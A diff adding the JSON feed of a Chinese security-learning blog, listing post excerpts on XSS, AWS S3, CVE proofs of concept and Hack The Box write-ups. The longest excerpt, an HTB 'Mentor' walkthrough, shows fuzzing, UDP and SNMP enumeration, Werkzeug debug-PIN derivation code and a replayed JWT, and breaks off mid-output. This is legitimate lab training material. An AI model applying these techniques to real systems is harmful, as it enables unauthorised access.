@@ -1,0 +1,686 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "星尘谷",
+    "home_page_url": "https://1dayluo.github.io/",
+    "feed_url": "https://1dayluo.github.io/feed.json",
+    "description": "欢迎来到我的blog. ^ ^",
+    "icon": "https://img2.imgtp.com/2024/04/27/qNeoZUIz.png",
+    "author": {
+        "name": "1dayluo",
+        "url": "https://valaxy.site"
+    },
+    "items": [
+        {
+            "id": "",
+            "content_html": "<p><s>偷悄悄：其实是技术分享用的PPT大纲</s></p>\n<p>后续会在blog继续更一些之前看到的h1的xss构造攻击链为rce的文章（或许）<br>\n更新了文章：<a href=\"https://1dayluo.github.io/po\">https://1dayluo.github.io/po</a></p>\n",
+            "url": "https://1dayluo.github.io/posts/history/xss-jin-jie-xue-xi-fen-xiang-yi",
+            "title": "XSS进阶学习分享（一）",
+            "date_modified": "2023-02-07T10:14:01.000Z",
+            "date_published": "2024-04-27T11:52:15.211Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>遇到一个DOM Colbbering题目<br>\n题目</p>\n<pre><code class=\"language-jsx\">function escape(input) {\n    // let's do a post redirection\n    try </code></pre>\n",
+            "url": "https://1dayluo.github.io/posts/history/xss-shui-ti-pian-guan-yu-dom-colbbering-yi-xie-ge-ren-li-jie",
+            "title": "XSS水题篇：关于DOM Colbbering一些个人理解",
+            "date_modified": "2023-02-01T14:44:38.000Z",
+            "date_published": "2024-04-27T11:52:15.211Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>大概写一下就继续忙自己的了。因为整理周报和今天下午要干的流程图突然觉得要梳理一下，自勉一下。<br>\n从7月份开始，突然打算在提交工作周报的基础上总结一下周报，确保自己能够确认工作是确实能让自己学到新的</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/yi-pian-zhen-dui-gong-zuo-hou-de-fan-si-huo-xu-de-sui-sui-nian",
+            "title": "一篇针对工作后的反思（或许)的碎碎念 ",
+            "date_modified": "2020-08-31T15:12:40.000Z",
+            "date_published": "2024-04-27T11:52:15.211Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>很遗憾的在开头说，过去一年里，我的重心并不在于「产出」，而是在于 积累和学习。因为我觉得我现在并不到产出的过程（虽然也有少数几个部分）。思来想去还是写一篇吧，毕竟也有很多人像我一样，从外行的noob开</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/2022-nian-zong-jie",
+            "title": "初九 潜龙勿用：自学安全小白的2022年总结  ",
+            "date_modified": "2023-01-02T14:15:11.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>最近思考自己的长期目标,发现最初定下目标的时候目标的框架是模糊的,随着你越走越深,发现自己的失败.主要是由于你在定目标时对目标的不够了解,你以为过程是A到D,D到F,实际上发现A到D之间还有BC,AB</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/20220714-hui-tou-kan-wang-qian-zou",
+            "title": "20220714 回头看,往前走",
+            "date_modified": "2022-07-14T10:31:08.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>公开靶场:<a href=\"http://flaws.cloud/\">http://flaws.cloud/</a></p>\n<h2>S3常见的安全问题</h2>\n<h3>安全问题概括</h3>\n<p>概括如下：</p>\n<ol>\n<li>s3桶名为全局变量，默认是aws上任意两个用户不能有</li>\n</ol>\n",
+            "url": "https://1dayluo.github.io/posts/history/aws-chang-jian-an-quan-wen-ti-zong-jie-yi",
+            "title": "AWS 常见安全问题总结（一）",
+            "date_modified": "2024-03-24T20:18:36.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h1>CC1链</h1>\n<h2>前言</h2>\n<p>大佬们文章很细很全, 为了给自己捋思路…….就比如: 把有疑惑的点反复看,然后在不同的文章里(以及google搜索,补充基础知识etc)找到”为什么这里用XXXX”的原因</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/cc1-lian-xue-xi-bi-ji",
+            "title": "CC1链 学习笔记",
+            "date_modified": "2023-07-11T09:29:59.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<blockquote>\n<p>堆点安全的博文，一直以来是笔记党。把去年8月的刷题笔记发上来。正在做的攻防世界没做啥刷题笔记，就用这篇代替啦（bu<br>\n今年光顾着写代码了，安全啥的给落下了还是要继续努力&gt;-&lt;  （而且发现好久不巩固是会忘记的，又要再次巩固学习一次了）</p>\n</blockquote>\n<p>题目列表</p>\n<ul>\n<li><a href=\"https://github.com/CHYbeta/Code-Audit-Challenges\">https://github.com/CHYbeta/Code-Audit-Challenges</a><br>\n<a href=\"https://blog.szfszf.top/tech/code-audit-challenge-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/\">https://blog.szfszf.top/tech/code-audit-challenge-代码审计练习笔记/</a></li>\n</ul>\n",
+            "url": "https://1dayluo.github.io/posts/history/code-audit-challengesphp-shua-ti-ji-lu-li-shi-bi-ji",
+            "title": "Code-Audit-Challenges#php 刷题记录【历史笔记】",
+            "date_modified": "2020-09-03T17:58:00.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>一篇水文。。。起名困难症（改了几次） 参考思路就行</p>\n<h2>POC构造思路</h2>\n<ol>\n<li>先生成rsa密钥 ：public key 和private key</li>\n</ol>\n<pre><code class=\"language-python\">import rsa \n</code></pre>\n",
+            "url": "https://1dayluo.github.io/posts/history/cve-2018-0114",
+            "title": "CVE-2018-0114 POC编写与实践",
+            "date_modified": "2022-11-28T21:27:49.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>官方的主要修复有：</p>\n<ul>\n<li>**[Makes HttpParameters case-insensitive](<a href=\"https://github.com/apache/struts/commit/d8c\">https://github.com/apache/struts/commit/d8c</a></li>\n</ul>\n",
+            "url": "https://1dayluo.github.io/posts/history/cve-2023-50164-lou-dong-fen-xi-yu-xue-xi",
+            "title": "CVE-2023-50164 漏洞分析与学习",
+            "date_modified": "2023-12-26T00:07:30.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p><img src=\"https://imgtu.com/i/HiARIA\" alt=\"\"></p>\n",
+            "url": "https://1dayluo.github.io/posts/history/geng-xin-liao-blog-nei-de-htb-de-wen-zhang-she-zhi-jia-mi",
+            "title": "更新了blog内的htb的文章,设置加密",
+            "date_modified": "2022-01-31T16:23:02.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<aside>\n💡 This exercise covers how to get code execution against the Git self hosted tool: Gogs.\n",
+            "url": "https://1dayluo.github.io/posts/history/gogs-rce-li-shi-lou-dong-xue-xi-bi-ji",
+            "title": " Gogs RCE 历史漏洞学习笔记",
+            "date_modified": "2023-05-25T19:23:23.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h1>Google Dorking Learn</h1>\n<p>Learn from: <a href=\"https://exposingtheinvisible.org/guides/google-dorking/\">https://exposingtheinvisible.org/guides/google-dorking/</a></p>\n<h2>To d</h2>\n",
+            "url": "https://1dayluo.github.io/posts/history/google-dorking-learn",
+            "title": "Google Dorking Learn",
+            "date_modified": "2022-02-01T22:24:18.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>Web Application Exploits and Defenses (<a href=\"http://google-gruyere.appspot.com\">google-gruyere.appspot.com</a>) <br>\n据说是包括了所有web2.0的漏洞</p>\n<h2>使用前需知</h2>\n",
+            "url": "https://1dayluo.github.io/posts/history/gruyereorbi-ji-yi-ge-web-ping-tai-de-lou-dong-xue-xi-bi-ji-",
+            "title": "[gruyere|笔记]一个web平台的漏洞学习笔记-",
+            "date_modified": "2021-03-02T11:15:59.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>学习自下的回答，本内容为阅读对应资料后的笔记和自己的理解：<br>\n<a href=\"https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work\">Why does Directory traversal attack %C0%AF work?</a></p>\n<h2>基础知识</h2>\n<p>bits：组成bytes，是最小的单位</p>\n<p>bytes：由8个bits组成。</p>\n<h2>URL编码</h2>\n<p>URL编码-</p>\n<ul>\n<li>也叫百分比编码（<a href=\"https://en.wikipedia.org/wiki/Percent-encoding\">https://en.wikipedia.org/wiki/Percent-encoding</a>）</li>\n<li>组成：%xx ，其中x代表一个十六进制的数字，能代表0-255内的数字</li>\n<li>%xx代表一个byte</li>\n</ul>\n<p>%C0%2F：对应十进制192 (1100 0000) 和175 (1010 1111),</p>\n<p>%C0%AF：对应十进制的192 (1100 0000)和47 (0010 1111)</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/guan-yu-mu-lu-bian-li-lou-dong-zhong-fei-biao-zhun-bian-ma-c02f-he-c0af-jun-neng-dai-biao-qie-jun-zai-lou-dong-zhong-sheng-xiao-de-yuan-li-tan-suo",
+            "title": " 关于目录遍历漏洞中，非标准编码%C0%2F和%C0%AF均能代表/，且均在漏洞中生效的原理探索",
+            "date_modified": "2021-08-17T12:47:40.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h1>window.opener 学习</h1>\n<p>[15:40]</p>\n<p>关于window.opener的补充学习：</p>\n<p><a href=\"https://medium.com/tsscyber/penetration-testing-window-opener-xss-vectors-part-2-7810ebfccc1d%5D(https://medium.com/tsscyber/penetration-testing-window-opener-xss-vectors-part-2-7810ebfccc1d)\"></a></p>\n<p>还是从part1开始读起吧（</p>\n<p>学习的过程偶尔会发愁，遇到很多英文，我还是一个头两个大。但是还是啃吧）：</p>\n<p>part1：<a href=\"https://medium.com/tsscyber/penetration-testing-window-opener-xss-vectors-part-1-c6be37701cab\">https://medium.com/tsscyber/penetration-testing-window-opener-xss-vectors-part-1-c6be37701cab</a></p>\n<p>和视频补充学习：<a href=\"https://www.youtube.com/watch?v=veXDFx2qJBk\">https://www.youtube.com/watch?v=veXDFx2qJBk</a></p>\n<p><strong>part1介绍的内容：</strong></p>\n<ul>\n<li>opener 变量 以及如何与同源政策相关联。</li>\n<li>该变量如何呗滥用以实现接近客户端重定向</li>\n</ul>\n<p><strong>part2介绍的内容：</strong></p>\n<ul>\n<li>在part1概念的基础上探讨新型XSS向量</li>\n</ul>\n<p><strong>part3介绍的内容：</strong></p>\n<ul>\n<li>来混淆一些有趣的跨窗口<code>eval</code> 函数 从而在第四部分讨论通用XSS的问题</li>\n</ul>\n<h1>Part 1</h1>\n<h2>Introducing the window.opener variable</h2>\n<p>open 函数通常被用于在弹出的窗口中打开一个URL。这个函数经常被不良的网站打开烦人或恶意的广告，但是同样也有合法的使用。当你调用open函数，浏览器自动在新窗口中赋值一个变量指向打开该窗口的源窗口。这个变量自然地称作”opener‘</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/guan-yu-opener-de-xue-xi-ji-li-yong",
+            "title": "关于opener的学习及利用",
+            "date_modified": "2021-08-27T08:01:04.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h1>petpet rcbee</h1>\n<p><s>又是一道flask+python的题(后来发现无关)</s></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/petpetrobee_1.png\" alt=\"Untitled\"></p>\n",
+            "url": "https://1dayluo.github.io/posts/history/htb-petpet-rcbee",
+            "title": "[HTB] petpet rcbee ",
+            "date_modified": "2021-12-28T17:57:12.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h1>Templated</h1>\n<p>是ssti漏洞.</p>\n<p>但是之前学习burpsuite下的题目的时候,没有学到这个.之前了解过概念.于是我专门回顾和学习了一下jinja2</p>\n<p>尝试访问不存在的路径:</p>\n<pre><code>payload : /xyz\n\nresponse : 发现会回显xyz在页面中\n</code></pre>\n",
+            "url": "https://1dayluo.github.io/posts/history/htb-templated-or-writeup",
+            "title": "[HTB] Templated | writeup",
+            "date_modified": "2021-12-15T16:54:33.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h1>Weather App</h1>\n<p>这道题值得慢慢啃,如果有缘看到我这篇writeup的话,建议你实在啃不下再看(或者只看卡住的地方)</p>\n<h2>题目分析</h2>\n<p>不管用burp抓包,还是分析源代码.均可以看到,天气的获取以POST方式请求了<code>/api/weather</code> 接口(源代码见<code>/static/js/main.js</code> )</p>\n<p>看源代码进行审计的时候,还发现了在<code>/static/host-unreachable.jpg</code> 下的一个图片</p>\n",
+            "url": "https://1dayluo.github.io/posts/history/htb-weather-App",
+            "title": " [HTB] 又一道writeup:Weather | 收获颇多",
+            "date_modified": "2021-12-22T17:47:53.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h1>Backend - API</h1>\n<p>突然想做这个box的起因是看到一条tweet，qwq 原来做box这么有用的嘛</p>\n<p>![Untitled](<a href=\"https://cdn.jsdelivr.net/gh/1d\">https://cdn.jsdelivr.net/gh/1d</a></p>\n",
+            "url": "https://1dayluo.github.io/posts/history/htbbackend-api",
+            "title": "[HTB]Backend - API",
+            "date_modified": "2022-04-17T14:19:16.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<p>标签：api, php, .git, ssrf, lfi to rce,post-commit hook,service</p>\n<p>………慢慢来，不要着急。打退役box积攒经验中…</p>\n<h2>Recon</h2>\n",
+            "url": "https://1dayluo.github.io/posts/history/htbencoding",
+            "title": " HTB：Encoding",
+            "date_modified": "2023-04-23T18:14:17.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h1>HTB：Forgot</h1>\n<h2>Recon</h2>\n<p>端口扫描结果</p>\n<p>1.nmap扫描结果：</p>\n<pre><code class=\"language-shell\">PORT   STATE SERVICE\n22/tcp open  ssh\n53/tcp o</code></pre>\n",
+            "url": "https://1dayluo.github.io/posts/history/htbforgot",
+            "title": "HTB:Forgot",
+            "date_modified": "2023-03-09T16:38:55.000Z",
+            "date_published": "2024-04-27T11:52:15.207Z",
+            "author": {
+                "name": "1dayluo",
+                "url": "https://valaxy.site"
+            }
+        },
+        {
+            "id": "",
+            "content_html": "<h1>HTB：Mentor</h1>\n<h2>RECON</h2>\n<p>是Flask（ <code>2.0.3</code>) 的网站，<strong>TCP</strong>端口扫描结果就是： <code>20</code>, <code>53</code> , <code>80</code> ，然后试着目录遍历（不过我第一次使用的字典暂时没有什么有价值的收获）和子域名，在这个同时我会去翻看网页源代码和其他信息</p>\n<p>在搜查的过程中，发现了使用到了 <code>Werkzeug</code> ，关于它的介绍如下：</p>\n<blockquote>\n<p>在Python Web开发中，Werkzeug通常与其他框架（如Flask、Django等）一起使用，作为这些框架的底层库。使用Werkzeug，开发人员可以更轻松地处理HTTP请求和响应，实现中间件（middleware）和拦截器（interceptor）等功能，以及进行调试和测试。</p>\n<p>总之，如果你在Python Web开发中需要处理HTTP请求和响应、实现中间件或进行调试和测试等任务，那么Werkzeug可能会是一个有用的技术栈</p>\n</blockquote>\n<p>在著名的<a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug\">hackertricks</a>下去查看一些针对 <code>Werkzeug</code> 的攻击手段，这里发现原始网页对 <code>/consoel</code> 是禁止访问的，所以需要去想办法查看PIN number</p>\n<p>原理讲解：<a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug\">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug</a></p>\n<p>PIN的生成主要在以下的两个list变量中</p>\n<pre><code class=\"language-python\">probably_public_bits = [\n    username,\n    modname,\n    getattr(app, '__name__', getattr(app.__class__, '__name__')),\n    getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n    str(uuid.getnode()),\n    get_machine_id(),\n]\n# getattr(app, '__name__', getattr (app .__ class__, '__name__')) is Flask \n# getattr(mod, '__file__', None) is the absolute path of an app.py in the flask directory\n# uuid.getnode() is the MAC address of the current computer, str (uuid.getnode ()) is the decimal expression of the mac address\n# get_machine_id() read the value in /etc/machine-id or /proc/sys/kernel/random/boot_i and return directly if there is\n</code></pre>\n<p>其中 mac地址在 <code>/proc/net/arp</code> （指的是Linux）</p>\n<p>然后挖掘了一下，发现不是这里的问题 🥲  我发现我老是把简单的问题想复杂……啊啊啊啊啊啊（菜狗痛苦.jpg)。然后直线距离会绕个弯走。但是等待扫描结果的过程真的好痛苦（菜狗痛苦×2.jpg)……</p>\n<p><img src=\"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/20230315.png\" alt=\"Untitled\"></p>\n<p>反复测试，最后子域名发现了（竟然是404）</p>\n<ul>\n<li>api.mentorquotes.htb</li>\n</ul>\n<p>同理，加入到 <code>/etc/hosts</code> 里。</p>\n<h2>子域名扫描</h2>\n<p>虽然我每个工具的命令都是单独总结的，但是偶尔贴一下吧</p>\n<pre><code class=\"language-python\">wfuzz -c -w &lt;dict&gt; -u &quot;http://api.mentorquotes.htb/FUZZ&quot; --hc 404\n</code></pre>\n<p>结果</p>\n<pre><code class=\"language-python\">=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                       \n=====================================================================\n000000004:   307        0 L      0 W        0 Ch        &quot;admin&quot;                                                                                                                                                                                       \n000000124:   200        30 L     62 W       969 Ch      &quot;docs&quot;                                                                                                                                                                                        \n000000205:   307        0 L      0 W        0 Ch        &quot;users&quot;\n000001440:   307        0 L      0 W        0 Ch        &quot;quotes&quot;\n000004658:   403        9 L      28 W       285 Ch      &quot;server-status&quot;\n\n</code></pre>\n<h2>/docs 探索</h2>\n<h3>Auth</h3>\n<p>以前也刷过关于api的box：<a href=\"https://1dayluo.github.io/post/htbbackend-api/\">https://1dayluo.github.io/post/htbbackend-api/</a>   （这个还真的不错，当时刷过一次就觉得学到了很多）</p>\n<p>注册</p>\n<p><img src=\"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303151.png\" alt=\"Untitled\"></p>\n<p>登录</p>\n<p><img src=\"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303152.png\" alt=\"Untitled\"></p>\n<p>返回的内容是：</p>\n<pre><code class=\"language-python\">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5la28xMjMiLCJlbWFpbCI6ImFiY0Bxd2UuY29tIn0.7UL_JZ9wxrauJQpEwNPXSXyqB2CGDo3pT4wmaNlQEr0\n</code></pre>\n<h3>Users</h3>\n<p>直接用docs下的发起是失败的</p>\n<p><img src=\"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303153.png\" alt=\"Untitled\"></p>\n<p>然后我注意到了</p>\n<p><img src=\"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303154.png\" alt=\"Untitled\"></p>\n<p>把刚刚login的内容作为jwt传入到header里</p>\n<pre><code class=\"language-lua\">GET /users/ HTTP/1.1\nHost: api.mentorquotes.htb\naccept: application/json\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36\nDNT: 1\nReferer: http://api.mentorquotes.htb/docs\nAuthorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5la28xMjMiLCJlbWFpbCI6ImFiY0Bxd2UuY29tIn0.7UL_JZ9wxrauJQpEwNPXSXyqB2CGDo3pT4wmaNlQEr0\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nsec-gpc: 1\nConnection: close\n</code></pre>\n<p>返回：</p>\n<pre><code class=\"language-lua\">{&quot;detail&quot;:&quot;Only admin users can access this resource&quot;}\n</code></pre>\n<p>包括 <code>/users/{id}</code> 也是一样，虽然有跳转，但是最终还是提示只有管理员用户可以使用。看起来应该用了规则匹配，后面的 <code>/users/add</code> 应该也是同理</p>\n<h3>Quotes</h3>\n<p>也是一样的道理。</p>\n<ol>\n<li>quotes - GET</li>\n</ol>\n<p><img src=\"https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303155.png\" alt=\"Untitled\"></p>\n<ol>\n<li>quotes - POST ： 提示只有管理员才可以</li>\n<li>quotes - PUT ： 提示只有管理员才可以</li>\n<li>quotes - POST ： 提示只有管理员才可以</li>\n<li>quotes - DELETE ： 提示只有管理员才可以</li>\n</ol>\n<h2>SNMP - private</h2>\n<p>api探索了好一阵，看哪里能获取管理员auth，但是无果。然后又回归到了大佬0xdf的博客（谢谢大佬TUT）</p>\n<p>我忽视了UDP port……</p>\n<pre><code class=\"language-bash\">sudo nmap -p- -sU --min-rate 10000 -oA /tmp/nmap-udp 10.10.11.193\n\n# 扫描结果：\n# PORT    STATE SERVICE\n# 161/udp open  snmp\n</code></pre>\n<p>问chatGPT和newBing关于SNMP是干嘛的回答</p>\n<blockquote>\n<p>chatGPT:<br>\n一个网站可能需要使用SNMP来监控网络设备的状态和性能，以确保网络设备正常运行。例如，如果网站依赖于负载均衡器、路由器、交换机等网络设备，监控这些设备的状态和性能可以帮助管理员及时发现和解决网络问题，提高网络的可用性和可靠性。此外，SNMP还可以用于收集网站服务器的性能指标，如CPU利用率、内存使用率、磁盘空间等，以帮助管理员优化网站性能和资源利用率。</p>\n</blockquote>\n<p>Bing:</p>\n<blockquote>\n<p>您好，这是Bing。😊</p>\n<p>SNMP（简单网络管理协议）是一种网络协议，用于管理和监视IP网络中的网络设备，如服务器，工作站，路由器，交换机等<a href=\"https://www.pconline.com.cn/win11/1511/15111684.html\">1</a>。一个网站可能需要用到SNMP的情况有：</p>\n<ul>\n<li>网站的管理员需要监控和配置网站的服务器或其他设备<a href=\"https://resources.infosecinstitute.com/topic/snmp-pentesting/\">2</a>。</li>\n<li>网站的安全测试人员需要检测网站是否存在SNMP相关的漏洞<a href=\"https://blog.domotz.com/know-your-networks/snmp-port-number/\">3</a> <a href=\"https://resources.infosecinstitute.com/topic/vulnerability-assessment-of-snmp-service-ii/\">4</a>。</li>\n<li>网站的用户需要通过SNMP获取网站的性能或状态信息。</li>\n</ul>\n<p>您想了解更多关于SNMP的什么内容呢？</p>\n</blockquote>\n<p>恩……这波是bing赢了</p>\n<p>snmp除了用nmap外，还有以下工具：</p>\n<ul>\n<li><a href=\"https://github.com/SECFORCE/SNMP-Brute.git\">https://github.com/SECFORCE/SNMP-Brute.git</a></li>\n<li><a href=\"https://github.com/trailofbits/onesixtyone\">https://github.com/trailofbits/onesixtyone</a></li>\n</ul>\n<p>我用了snmp-brute。首先要根据README下载一些基础依赖。然后按照官方/help来的运行就好，</p>\n<p>工具捕获到的数据 （发现管理员邮箱）</p>\n<pre><code class=\"language-bash\">################## Enumerating SYSTEM Table using: iso.3.6.1.2.1.1  (SYSTEM Info)\n\tINFO\n\t----\t\n\tSTRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64\n\tOID: NET-SNMP-MIB::netSnmpAgentOIDs.10\n\tTimeticks: (6160235) 17:06:42.35\n\tSTRING: Me &lt;admin@mentorquotes.htb&gt;\n\tSTRING: mentor\n\tSTRING: Sitting on the Dock of the Bay\n\tINTEGER: 72\n\n################## Enumerating Interfaces Table using: -Ci (Interface Info)\n\tName   Mtu Network Address Ipkts Ierrs Opkts Oerrs Queue\n\n################## Enumerating Routing Table using: -Cr (Route Info)\n\n################## Enumerating Netstat Table using:  (Netstat)\n\tActive Internet (udp) Connections\n\tProto Local Address               Remote Address                PID\n\tudp4  *.*                         *.*                             0\n</code></pre>\n<p>这里不太会，就跟着佬们的writeup来学习了，</p>\n<p>然后我用了 <code>snmpbulkwalk</code> 工具</p>\n<pre><code class=\"language-bash\">HOST-RESOURCES-MIB::hrSWRunPath.921 = STRING: &quot;/usr/libexec/udisks2/udisksd&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.927 = STRING: &quot;/usr/sbin/ModemManager&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1200 = STRING: &quot;/usr/sbin/cron&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1208 = STRING: &quot;/usr/sbin/snmpd&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1221 = STRING: &quot;/usr/bin/containerd&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1242 = STRING: &quot;/sbin/agetty&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1243 = STRING: &quot;sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1254 = STRING: &quot;/usr/sbin/apache2&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1340 = STRING: &quot;/usr/bin/dockerd&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1691 = STRING: &quot;/bin/bash&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1742 = STRING: &quot;/usr/bin/docker-proxy&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1755 = STRING: &quot;/usr/bin/containerd-shim-runc-v2&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1781 = STRING: &quot;postgres&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1838 = STRING: &quot;postgres: checkpointer &quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1839 = STRING: &quot;postgres: background writer &quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1840 = STRING: &quot;postgres: walwriter &quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1841 = STRING: &quot;postgres: autovacuum launcher &quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1842 = STRING: &quot;postgres: stats collector &quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1843 = STRING: &quot;postgres: logical replication launcher &quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1849 = STRING: &quot;/usr/bin/docker-proxy&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1863 = STRING: &quot;/usr/bin/containerd-shim-runc-v2&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1889 = STRING: &quot;python3&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1958 = STRING: &quot;/usr/bin/docker-proxy&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1971 = STRING: &quot;/usr/bin/containerd-shim-runc-v2&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.1993 = STRING: &quot;python&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.2007 = STRING: &quot;/usr/local/bin/python3&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.2008 = STRING: &quot;/usr/local/bin/python3&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.2092 = STRING: &quot;postgres: postgres mentorquotes_db 172.22.0.1(46844) idle&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.2110 = STRING: &quot;/usr/bin/python3&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.26610 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.26614 = STRING: &quot;postgres: postgres mentorquotes_db 172.22.0.1(60892) idle&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.91129 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.91137 = &quot;&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.91143 = STRING: &quot;sh&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.91144 = STRING: &quot;/bin/sh&quot;\nHOST-RESOURCES-MIB::hrSWRunPath.91148 = STRING: 